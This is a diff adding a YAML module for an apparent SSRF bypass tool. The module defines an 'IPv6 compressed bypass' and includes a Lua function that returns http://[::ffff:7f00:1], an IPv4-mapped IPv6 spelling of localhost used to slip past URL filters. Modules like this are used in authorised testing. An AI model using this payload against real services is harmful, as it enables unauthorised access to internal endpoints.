@@ -1,0 +1,24 @@
+meta:
+  id: rare_ipv6_compressed
+  version: 1
+  name: "Rare IPv6 Compressed Bypass"
+  description: "Uses compressed IPv4-mapped IPv6 address formats"
+  author: "SSRFdevil"
+  created: "2026-06-19"
+  updated: "2026-06-19"
+  rank: 60
+  confidence: 90
+  severity: medium
+  tags: [ipv6, compressed, bypass]
+  references: []
+match:
+  schemes: [http, https]
+  requires: [hostname]
+  supports: [ipv6]
+script:
+  language: lua
+  entry: bypass
+  source: |
+    function bypass(ctx)
+      return { url = "http://[::ffff:7f00:1]" }
+    end
